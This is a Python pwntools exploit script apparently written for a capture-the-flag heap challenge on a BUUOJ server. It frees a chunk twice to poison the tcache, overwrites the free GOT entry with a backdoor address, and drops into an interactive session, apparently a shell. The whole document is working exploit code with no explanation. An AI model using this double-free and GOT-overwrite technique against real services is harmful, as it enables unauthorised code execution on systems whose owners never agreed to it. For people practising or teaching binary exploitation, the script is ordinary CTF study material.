from pwn import *

r = remote("node3.buuoj.cn", 27910)

context.arch = 'amd64'
backdoor_addr = 0x400D86
free_got = 0x602018


def add(size, content):
    r.recvuntil('u choice :\n')
    r.send('1')
    r.recvline()
    r.send(str(size))
    r.recvline()
    r.send(content)


def delete(index):
    r.recvuntil('u choice :\n')
    r.send('2')
    r.recvuntil('Index :')
    r.send(str(index))


def show(index):
    r.recvuntil('u choice :\n')
    r.send('3')
    r.recvuntil('Index :')
    r.send(str(index))


add(0x30, 'da')
delete(0)
delete(0)
add(0x10, p64(free_got))
add(0x10, 'da')
add(0x10, p64(backdoor_addr))
delete(0)
r.recvline()
r.interactive()
